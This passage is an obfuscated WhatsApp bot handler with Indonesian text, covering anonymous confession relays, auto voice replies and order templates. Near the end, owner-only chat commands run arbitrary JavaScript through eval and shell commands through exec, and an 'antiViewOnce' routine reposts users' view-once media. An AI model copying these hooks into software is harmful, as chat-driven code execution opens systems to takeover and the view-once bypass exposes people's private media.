            var _0x265361 = _0x5804c8(0x13a) + _0x2f5f94 + _0x5804c8(0x332) + _0x2b9ee2 + _0x5804c8(0x331) + _0x3b7c58 + _0x5804c8(0xa53) + _0x3b7c58 + 'tolakmenfess -- Untuk menolak menfess/confess\x0a\x0a_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_';
            let _0x353e31 = await getBuffer(_0x5804c8(0x29d)),
                _0xf01217 = _0x1b1e88[_0x5804c8(0xd13)];
            this[_0x5804c8(0x989)][_0xf01217] = {
                'id': _0xf01217,
                'a': _0x1b1e88[_0x5804c8(0xd13)],
                'b': _0x5d0892 + '@s.whatsapp.net',
                'state': 'WAITING'
            }, await _0x614da8[_0x5804c8(0x938)](_0x5d0892 + _0x5804c8(0x7cd), {
                'image': _0x353e31,
                'caption': _0x265361
            }, {}), _0x358f3b(_0x5804c8(0x2de));
        }
        break;
        case _0x5804c8(0x93d):
        case 'balasmenfes': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            roof = Object[_0x5804c8(0x960)](this[_0x5804c8(0x989)])[_0x5804c8(0x958)](_0x108f8f => [_0x108f8f['a'], _0x108f8f['b']][_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)]));
            if (!roof) return _0x358f3b(_0x5804c8(0xd93));
            find = Object[_0x5804c8(0x960)](this[_0x5804c8(0x989)])[_0x5804c8(0x958)](_0x709f6c => _0x709f6c[_0x5804c8(0xcdc)] == _0x5804c8(0x1b3));
            let _0x33c85c = Object['values'](this[_0x5804c8(0x989)])[_0x5804c8(0x958)](_0x3dc7a4 => [_0x3dc7a4['a'], _0x3dc7a4['b']][_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)]) && _0x3dc7a4[_0x5804c8(0xcdc)] === _0x5804c8(0x1b3)),
                _0x321f66 = [_0x33c85c['a'], _0x33c85c['b']]['find'](_0xb5cfd8 => _0xb5cfd8 !== _0x1b1e88[_0x5804c8(0xd13)]);
            find['b'] = _0x1b1e88[_0x5804c8(0xd13)], find[_0x5804c8(0xcdc)] = _0x5804c8(0x531), this[_0x5804c8(0x989)][find['id']] = {
                ...find
            }, await _0x614da8[_0x5804c8(0x938)](_0x321f66, {
                'text': '_@' + _0x1b1e88[_0x5804c8(0xd13)]['split']('@')[0x0] + _0x5804c8(0x841),
                'mentions': [_0x1b1e88[_0x5804c8(0xd13)]]
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': _0x5804c8(0x2c3)
            });
        }
        break;
        case _0x5804c8(0xaf9):
        case _0x5804c8(0x6ca): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            roof = Object[_0x5804c8(0x960)](this['menfes'])[_0x5804c8(0x958)](_0x332538 => [_0x332538['a'], _0x332538['b']]['includes'](_0x1b1e88[_0x5804c8(0xd13)]));
            if (!roof) return _0x358f3b(_0x5804c8(0xd93));
            let _0x271a46 = Object[_0x5804c8(0x960)](this[_0x5804c8(0x989)])[_0x5804c8(0x958)](_0x56dcbf => [_0x56dcbf['a'], _0x56dcbf['b']][_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)]) && _0x56dcbf[_0x5804c8(0xcdc)] === _0x5804c8(0x1b3)),
                _0xba157e = [_0x271a46['a'], _0x271a46['b']][_0x5804c8(0x958)](_0x993fad => _0x993fad !== _0x1b1e88[_0x5804c8(0xd13)]);
            find = Object[_0x5804c8(0x960)](this[_0x5804c8(0x989)])[_0x5804c8(0x958)](_0x3a2088 => _0x3a2088[_0x5804c8(0xcdc)] == _0x5804c8(0x1b3)), _0x614da8[_0x5804c8(0x938)](_0xba157e, {
                'text': _0x5804c8(0x13f) + _0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0xbf6),
                'mentions': [_0x1b1e88[_0x5804c8(0xd13)]]
            }), _0x358f3b(_0x5804c8(0x5e3)), delete this[_0x5804c8(0x989)][roof['id']];
        }
        break;
        case 'stopconfess':
        case _0x5804c8(0x9a3): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            find = Object['values'](this['menfes'])[_0x5804c8(0x958)](_0x5b5a20 => [_0x5b5a20['a'], _0x5b5a20['b']][_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)]));
            if (!find) return _0x358f3b(_0x5804c8(0xd93));
            const _0x22c119 = find['a'] == _0x1b1e88[_0x5804c8(0xd13)] ? find['b'] : find['a'];
            _0x614da8[_0x5804c8(0x938)](_0x22c119, {
                'text': _0x5804c8(0x219),
                'mentions': [_0x1b1e88[_0x5804c8(0xd13)]]
            }), await _0x358f3b('ok'), delete this[_0x5804c8(0x989)][find['id']];
        }
        break;
        default:
            _0x22c514 && [_0x5804c8(0x19d), 'assalamualaikum', _0x5804c8(0x9db)][_0x5804c8(0x34b)](_0x22c514) && !_0x201454 && (goblok = fs[_0x5804c8(0x456)]('./media/sound/salam.mp3'), _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'audio': goblok,
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            }));
            _0x22c514 && [_0x5804c8(0x69f), 'anjay'][_0x5804c8(0x34b)](_0x22c514) && !_0x201454 && (goblok = fs[_0x5804c8(0x456)](_0x5804c8(0x4ad)), _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': goblok,
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            }));
            _0x22c514 && [_0x5804c8(0xaee), ' ajojing'][_0x5804c8(0x34b)](_0x22c514) && !_0x201454 && (goblok = fs[_0x5804c8(0x456)](_0x5804c8(0x87f)), _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'audio': goblok,
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            }));
            _0x22c514 && [_0x5804c8(0x5fd), 'bot'][_0x5804c8(0x34b)](_0x22c514) && !_0x201454 && (list = [_0x5804c8(0x832), _0x5804c8(0x37b), './media/sound/iya.mp3'], _0x1b1281 = list[Math[_0x5804c8(0xa2b)](Math['random']() * list[_0x5804c8(0x977)])], goblok = fs['readFileSync'](_0x1b1281), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': goblok,
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            }));
            _0x22c514 && ['Thx', 'Tq', _0x5804c8(0xce4), _0x5804c8(0xb85), _0x5804c8(0x94b)][_0x5804c8(0x34b)](_0x22c514) && !_0x201454 && _0x358f3b(_0x5804c8(0x96f) + _0x32b235);
            _0x22c514 && [_0x5804c8(0x299), 'Anj', 'Babi', _0x5804c8(0x358), _0x5804c8(0x94f), _0x5804c8(0xa10), _0x5804c8(0x69e), 'Pantek'][_0x5804c8(0x34b)](_0x22c514) && !_0x201454 && (goblok = fs['readFileSync'](_0x5804c8(0xc85)), _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'audio': goblok,
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            }));
            _0x22c514 && [_0x5804c8(0xbf2), '🗿🗿🗿🗿', '🗿🗿', '🗿'][_0x5804c8(0x34b)](_0x22c514) && !_0x201454 && _0x358f3b('🗿');
            if (_0x22c514 && [_0x5804c8(0x9ee), _0x5804c8(0x335)]['includes'](_0x22c514) && !_0x201454) {
                if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
                if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
                if (!_0x1b1e88[_0x5804c8(0x6a4)]) return _0x358f3b('Reply pesanan yang akan proses');
                let _0x3c538d = _0x1b1e88[_0x5804c8(0x6a4)] ? _0x8a4e1a[_0x5804c8(0x73c)] : _0x8a4e1a[_0x5804c8(0x73c)][_0x5804c8(0x4bd)](_0x83eae5[0x0])[0x1],
                    _0x46ce04 = _0x5804c8(0x974);
                const _0x442fa9 = getTextSetProses(_0x1b1e88[_0x5804c8(0x60f)], set_proses);
                if (_0x442fa9 !== undefined) {
                    var _0x3d0949 = _0x442fa9[_0x5804c8(0xa72)]('@pesanan', _0x3c538d ? _0x3c538d : '-')[_0x5804c8(0xa72)](_0x5804c8(0x5b4), '@' + _0x1b1e88[_0x5804c8(0x6a4)]['sender'][_0x5804c8(0x4bd)]('@')[0x0])[_0x5804c8(0xa72)](_0x5804c8(0x58b), _0x4fb4a6)['replace'](_0x5804c8(0xb1f), tanggal(new Date()))[_0x5804c8(0xa72)](_0x5804c8(0x5b4), '@' + _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0]);
                    _0x614da8[_0x5804c8(0x2a4)](_0x1b1e88[_0x5804c8(0x60f)], _0x3d0949, _0x1b1e88);
                } else _0x614da8['sendTextWithMentions'](_0x1b1e88['chat'], _0x46ce04[_0x5804c8(0xa72)](_0x5804c8(0xd4f), _0x3c538d ? _0x3c538d : '-')[_0x5804c8(0xa72)](_0x5804c8(0x5b4), '@' + _0x1b1e88['quoted'][_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0])[_0x5804c8(0xa72)]('@jam', _0x4fb4a6)[_0x5804c8(0xa72)](_0x5804c8(0xb1f), tanggal(new Date()))[_0x5804c8(0xa72)]('@user', '@' + _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)]['split']('@')[0x0]), _0x1b1e88);
            }
            if (_0x22c514 && [_0x5804c8(0x384), _0x5804c8(0x73f)][_0x5804c8(0x34b)](_0x22c514) && !_0x201454) {
                if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
                if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
                if (!_0x1b1e88[_0x5804c8(0x6a4)]) return _0x358f3b(_0x5804c8(0x8e8));
                let _0xb43e6b = _0x1b1e88[_0x5804c8(0x6a4)] ? _0x8a4e1a['text'] : _0x8a4e1a['text'][_0x5804c8(0x4bd)](_0x83eae5[0x0])[0x1],
                    _0xb2cd32 = _0x5804c8(0x150);
                const _0x5d6c80 = getTextSetDone(_0x1b1e88['chat'], set_done);
                if (_0x5d6c80 !== undefined) {
                    var _0x3d0949 = _0x5d6c80['replace']('@pesanan', _0xb43e6b ? _0xb43e6b : '-')[_0x5804c8(0xa72)](_0x5804c8(0x5b4), '@' + _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0])[_0x5804c8(0xa72)](_0x5804c8(0x58b), _0x4fb4a6)[_0x5804c8(0xa72)](_0x5804c8(0xb1f), tanggal(new Date()))[_0x5804c8(0xa72)](_0x5804c8(0x5b4), '@' + _0x1b1e88['quoted']['sender'][_0x5804c8(0x4bd)]('@')[0x0]);
                    _0x614da8[_0x5804c8(0x2a4)](_0x1b1e88[_0x5804c8(0x60f)], _0x3d0949, _0x1b1e88);
                } else _0x614da8['sendTextWithMentions'](_0x1b1e88['chat'], _0xb2cd32[_0x5804c8(0xa72)](_0x5804c8(0xd4f), _0xb43e6b ? _0xb43e6b : '-')[_0x5804c8(0xa72)](_0x5804c8(0x5b4), '@' + _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0])[_0x5804c8(0xa72)]('@jam', _0x4fb4a6)['replace'](_0x5804c8(0xb1f), tanggal(new Date()))[_0x5804c8(0xa72)](_0x5804c8(0x5b4), '@' + _0x1b1e88['quoted'][_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0]), _0x1b1e88);
            }
            if (_0x22c514[_0x5804c8(0xac2)](_0x5804c8(0xd61))) {
                if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);

                function _0x41c62d(_0x148ad4) {
                    const _0x424950 = _0x5804c8;
                    return sat = JSON[_0x424950(0x736)](_0x148ad4, null, 0x2), bang = util[_0x424950(0xb27)](sat), sat == undefined && (bang = util[_0x424950(0xb27)](_0x148ad4)), _0x358f3b(bang);
                }
                try {
                    _0x358f3b(util[_0x5804c8(0xb27)](eval(_0x5804c8(0x7b8) + _0x22c514[_0x5804c8(0x7af)](0x3) + _0x5804c8(0x18a))));
                } catch (_0x1ba770) {
                    _0x358f3b(util[_0x5804c8(0xb27)](_0x1ba770));
                }
            }
            if (_0x22c514[_0x5804c8(0xac2)]('> ')) {
                if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
                try {
                    let _0x10cbcb = await eval(_0x22c514[_0x5804c8(0x7af)](0x2));
                    if (typeof _0x10cbcb !== _0x5804c8(0x36a)) _0x10cbcb = require(_0x5804c8(0xd2a))['inspect'](_0x10cbcb);
                    await _0x358f3b(_0x10cbcb);
                } catch (_0x3d377a) {
                    await _0x358f3b(util['format'](_0x3d377a));
                }
            }
            if (_0x22c514[_0x5804c8(0xac2)]('$ ')) {
                if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
                exec(_0x22c514[_0x5804c8(0x7af)](0x2), (_0x296c3d, _0x5d0838) => {
                    if (_0x296c3d) return _0x358f3b('' + _0x296c3d);
                    if (_0x5d0838) return _0x358f3b(_0x5d0838);
                });
            }
            if (_0x1b1e88[_0x5804c8(0x541)] == 'viewOnceMessageV2') {
                if (!_0x932571['antiViewOnce']) return;
                let _0x12316b = _0x1b1e88['message'][_0x5804c8(0x740)][_0x5804c8(0x200)];
                console['log'](_0x12316b);
                let _0x3291db = Object[_0x5804c8(0xafa)](_0x12316b)[0x0],
                    _0x35740e = await downloadContentFromMessage(_0x12316b[_0x3291db], _0x3291db == _0x5804c8(0x22d) ? 'image' : _0x5804c8(0x7f5)),
                    _0x4e3a3e = Buffer[_0x5804c8(0x44e)]([]);
                for await (const _0x33b29b of _0x35740e) {
                    _0x4e3a3e = Buffer['concat']([_0x4e3a3e, _0x33b29b]);
                }
                let _0x50248a = _0x5804c8(0x99c) + _0x1b1e88['pushName'] + _0x5804c8(0xb6a) + _0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x4a3) + moment['tz'](_0x5804c8(0x8cb))[_0x5804c8(0xb27)](_0x5804c8(0x258)) + ' WIB\x0a✍️ *MessageType* : ' + _0x1b1e88[_0x5804c8(0x541)] + '\x0a💬 *Caption* : ' + (_0x1b1e88[_0x5804c8(0x278)][_0x5804c8(0xb63)] ? _0x1b1e88[_0x5804c8(0x278)][_0x5804c8(0xb63)] : _0x5804c8(0x9d6));
                await _0x614da8['sendTextWithMentions'](_0x1b1e88[_0x5804c8(0x60f)], _0x50248a, _0x1b1e88), await delay(0x1f4);
                if (/video/ [_0x5804c8(0xbaa)](_0x3291db)) return _0x614da8[_0x5804c8(0x51b)](_0x1b1e88['chat'], _0x4e3a3e, _0x5804c8(0x851), _0x12316b[_0x3291db][_0x5804c8(0xb63)] || '', _0x1b1e88);
                else {
                    if (/image/ [_0x5804c8(0xbaa)](_0x3291db)) return _0x614da8[_0x5804c8(0x51b)](_0x1b1e88[_0x5804c8(0x60f)], _0x4e3a3e, 'media.jpg', _0x12316b[_0x3291db][_0x5804c8(0xb63)] || '', _0x1b1e88);
                }
            }
            if (_0x1b1e88['chat'][_0x5804c8(0x470)](_0x5804c8(0x7cd)) && !_0x201454) {
                this[_0x5804c8(0x989)] = this['menfes'] ? this[_0x5804c8(0x989)] : {};
                let _0x522bfb = Object[_0x5804c8(0x960)](this[_0x5804c8(0x989)])[_0x5804c8(0x958)](_0x5c0b47 => [_0x5c0b47['a'], _0x5c0b47['b']][_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)]) && _0x5c0b47[_0x5804c8(0xcdc)] === _0x5804c8(0x531));
                if (_0x522bfb) {
                    if (/^.*(next|leave|start)/ [_0x5804c8(0xbaa)](_0x1b1e88[_0x5804c8(0x73c)])) return;
                    if ([_0x5804c8(0xc3f), _0x5804c8(0x852), _0x5804c8(0x9ad), '.start', _0x5804c8(0x7b6), 'Keluar', 'Lanjut', _0x5804c8(0x978)][_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0x73c)])) return;
                    find = Object[_0x5804c8(0x960)](this['menfes'])[_0x5804c8(0x958)](_0x57aa59 => [_0x57aa59['a'], _0x57aa59['b']][_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)]));
                    let _0x2bb78b = find['a'] == _0x1b1e88[_0x5804c8(0xd13)] ? find['b'] : find['a'];
                    await _0x1b1e88[_0x5804c8(0x15a)](_0x2bb78b, !![], _0x1b1e88[_0x5804c8(0x6a4)] && _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xcbd)] ? {
                        'contextInfo': {
                            ..._0x1b1e88[_0x5804c8(0x278)][_0x5804c8(0x3dd)],
                            'participant': _0x2bb78b
                        }
                    } : {});
                }
            }
            if (_0x1b1e88['chat']['endsWith'](_0x5804c8(0x7cd)) && !_0x201454) {
                this[_0x5804c8(0xa31)] = this[_0x5804c8(0xa31)] ? this[_0x5804c8(0xa31)] : {};
                let _0x288791 = Object[_0x5804c8(0x960)](this[_0x5804c8(0xa31)])['find'](_0xc3e294 => [_0xc3e294['a'], _0xc3e294['b']][_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)]) && _0xc3e294[_0x5804c8(0xcdc)] === _0x5804c8(0x531));
                if (_0x288791) {
                    if (/^.*(next|leave|start)/ [_0x5804c8(0xbaa)](_0x1b1e88[_0x5804c8(0x73c)])) return;
                    if ([_0x5804c8(0xc3f), _0x5804c8(0x852), _0x5804c8(0x9ad), '.start', 'Cari Partner', _0x5804c8(0xc9c), 'Lanjut', _0x5804c8(0x978)][_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0x73c)])) return;
                    let _0x43abf8 = [_0x288791['a'], _0x288791['b']][_0x5804c8(0x958)](_0x47f13b => _0x47f13b !== _0x1b1e88[_0x5804c8(0xd13)]);
                    _0x1b1e88['copyNForward'](_0x43abf8, !![], _0x1b1e88[_0x5804c8(0x6a4)] && _0x1b1e88['quoted']['fromMe'] ? {
                        'contextInfo': {
                            ..._0x1b1e88[_0x5804c8(0x278)]['contextInfo'],
                            'forwardingScore': 0x0,
                            'isForwarded': !![],
                            'participant': _0x43abf8
                        }
                    } : {});
                }
                return !0x0;
            }
        }
    } catch (_0x3433f4) {
        _0x1b1e88[_0x5804c8(0x322)](util[_0x5804c8(0xb27)](_0x3433f4));
    }
};
let file = require[_0x2dea4c(0x86b)](__filename);
fs[_0x2dea4c(0x84a)](file, () => {
    const _0x3bbf5b = _0x2dea4c;
    fs[_0x3bbf5b(0x589)](file), console[_0x3bbf5b(0xcd3)](chalk[_0x3bbf5b(0x612)]('Update ' + __filename)), delete require['cache'][file], require(file);
});